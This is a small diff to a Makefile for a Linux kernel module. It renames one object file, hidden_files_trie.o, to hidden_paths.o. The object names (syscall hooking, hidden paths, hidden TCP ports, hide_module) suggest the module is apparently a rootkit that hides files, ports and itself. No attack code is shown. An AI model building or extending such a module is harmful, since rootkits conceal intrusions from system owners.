@@ -4,7 +4,7 @@ FLAGS := -Wall
 KMOD_DIR := $(shell pwd)
 CXX := g++
 
-OBJECTS := module.o syscall_hooking_lib.o chars_trie.o communicate.o hidden_files_trie.o hidden_tcp_ports.o hide_module.o
+OBJECTS := module.o syscall_hooking_lib.o chars_trie.o communicate.o hidden_paths.o hidden_tcp_ports.o hide_module.o
 CONFIG_LTO = y
 
 ccflags-y += $(FLAGS)
